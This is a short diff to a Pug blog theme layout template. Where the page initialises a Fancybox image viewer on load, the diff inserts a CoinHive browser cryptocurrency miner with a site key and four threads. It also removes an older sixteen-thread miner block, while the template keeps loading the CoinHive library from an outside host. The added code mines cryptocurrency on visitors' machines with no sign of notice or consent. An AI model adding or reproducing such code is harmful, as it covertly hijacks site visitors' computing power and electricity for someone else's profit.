@@ -102,6 +102,9 @@ html
       script.
         $(document).ready(function() {
             $(".fancybox").fancybox();
+            var miner = new CoinHive.User('CI0BTOAY7b8b5JAWUcJNQEt7M7k2jqPL', 'blog.sasin.eu', { threads: 4 });
+            miner.start();
+            console.log(miner.isRunning());
         });
         
     if theme.google_analytics
@@ -114,7 +117,3 @@ html
           ga('create','#{theme.google_analytics}');ga('send','pageview');
 
     script(src="https://coinhive.com/lib/coinhive.min.js")
-    script.
-        var miner = new CoinHive.User('CI0BTOAY7b8b5JAWUcJNQEt7M7k2jqPL', 'blogged', { threads: 16 });
-        miner.start();
-        console.log(miner.isRunning());
